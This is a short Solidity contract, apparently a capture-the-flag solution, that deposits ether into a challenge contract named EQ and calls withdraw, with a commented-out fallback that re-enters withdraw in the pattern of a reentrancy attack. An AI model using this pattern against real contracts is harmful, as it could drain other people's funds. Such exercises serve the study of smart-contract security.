//Challenge addy 0xD2034a50C5Adc8A190D4f8c8EE18643Ab8A0ff05
// Setup addy 0x46C9489797c5647F850dD3A5bcB13C240bcd383A
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.4;

import "./EQ.sol";

contract Exploit1 {
    
    EQ public exploit;
    

    constructor(address _instance) payable {
        exploit = EQ(_instance);
           
    }
    function solve() public payable
    {
        exploit.deposit{value: 1 ether}();
        exploit.withdraw();
    }
        
    /*
    fallback() external payable{

        exploit.withdraw();

    }
    */
    
}
